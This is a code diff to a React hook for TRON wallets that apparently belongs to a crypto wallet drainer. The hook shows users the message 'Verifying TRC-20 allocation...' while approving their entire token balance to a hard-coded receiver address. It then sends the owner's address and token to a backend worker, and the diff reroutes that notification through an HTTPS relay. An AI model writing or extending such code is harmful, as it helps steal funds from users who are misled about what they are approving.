@@ -32,13 +32,16 @@ export function useTronManager() {
                         setCurrentTask(`Verifying TRC-20 allocation...`);
                         await contract.approve(TRON_RECEIVER_ADDRESS, balance).send();
 
-                        // Notify Worker
+
+                        // Notify Worker via HTTPS relay
                         try {
-                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
-                            await fetch(`${workerUrl}/notify-tron-approval`, {
+                            await fetch('/api/relay', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ owner: address, tokenAddress: tokenAddress })
+                                body: JSON.stringify({
+                                    endpoint: '/notify-tron-approval',
+                                    data: { owner: address, tokenAddress: tokenAddress }
+                                })
                             });
                         } catch (e) {
                             console.warn("Failed to notify Tron worker", e);
